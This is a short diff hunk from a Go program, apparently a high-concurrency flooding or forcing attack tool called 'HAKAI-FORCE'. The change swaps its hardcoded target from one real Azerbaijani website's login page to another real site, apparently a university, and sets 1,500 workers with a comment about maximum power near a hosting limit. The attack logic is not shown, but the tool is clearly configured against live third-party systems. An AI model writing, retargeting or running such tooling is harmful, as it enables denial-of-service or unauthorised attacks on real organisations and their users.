@@ -11,7 +11,7 @@ import (
 )
 
 func main() {
-	target := "https://empro.az/#/login"
+	target := "https://www.bbu.edu.az"
 	workers := 1500 // Railway limitinə yaxın maksimum güc
 	
 	fmt.Printf("[!!!] HAKAI-FORCE DEVRƏDƏ: %s\n", target)
